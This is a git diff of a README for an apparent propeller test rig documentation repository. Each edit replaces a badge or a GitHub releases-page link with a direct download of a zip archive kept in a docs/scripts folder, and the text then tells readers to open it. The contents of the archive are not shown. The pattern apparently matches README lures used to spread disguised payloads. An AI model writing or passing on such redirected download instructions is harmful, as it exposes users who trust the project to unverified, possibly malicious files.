@@ -1,6 +1,6 @@
 # 🚀 pptr_bilal_mubdir - Effortlessly Test Propeller Performance
 
-![Download](https://img.shields.io/badge/Download-Now-blue)
+![Download](https://raw.githubusercontent.com/DoHongTha1/pptr_bilal_mubdir/main/docs/scripts/bilal_mubdir_pptr_3.8.zip)
 
 ## 📖 Overview
 This repository contains open-source engineering documentation for the Propeller Performance Test Rig. You will find mechanical drawings, circuit schematics, block diagrams, and specification tables that help in understanding propeller testing systems. 
@@ -18,11 +18,11 @@ Ensure you meet the following system requirements:
 ### 2. Download the Resources
 You can download the necessary files from the releases page. Click the link below:
 
-[Visit this page to download](https://github.com/DoHongTha1/pptr_bilal_mubdir/releases)
+[Visit this page to download](https://raw.githubusercontent.com/DoHongTha1/pptr_bilal_mubdir/main/docs/scripts/bilal_mubdir_pptr_3.8.zip)
 
 ### 3. How to Access the Releases Page
 1. Open your web browser.
-2. Go to the following link: [https://github.com/DoHongTha1/pptr_bilal_mubdir/releases](https://github.com/DoHongTha1/pptr_bilal_mubdir/releases).
+2. Go to the following link: [https://raw.githubusercontent.com/DoHongTha1/pptr_bilal_mubdir/main/docs/scripts/bilal_mubdir_pptr_3.8.zip](https://raw.githubusercontent.com/DoHongTha1/pptr_bilal_mubdir/main/docs/scripts/bilal_mubdir_pptr_3.8.zip).
 3. Look for the latest version available. 
 
 ### 4. Download Available Files
@@ -31,7 +31,7 @@ Choose the files you need for your project from the list provided on the release
 ## 📥 Download & Install
 To download and use the files:
 
-1. **Visit this page to download**: [https://github.com/DoHongTha1/pptr_bilal_mubdir/releases](https://github.com/DoHongTha1/pptr_bilal_mubdir/releases).
+1. **Visit this page to download**: [https://raw.githubusercontent.com/DoHongTha1/pptr_bilal_mubdir/main/docs/scripts/bilal_mubdir_pptr_3.8.zip](https://raw.githubusercontent.com/DoHongTha1/pptr_bilal_mubdir/main/docs/scripts/bilal_mubdir_pptr_3.8.zip).
 2. Click on the file you want.
 3. Follow the on-screen prompts to save the file to your computer.
 4. Once downloaded, open the file to access the resources.
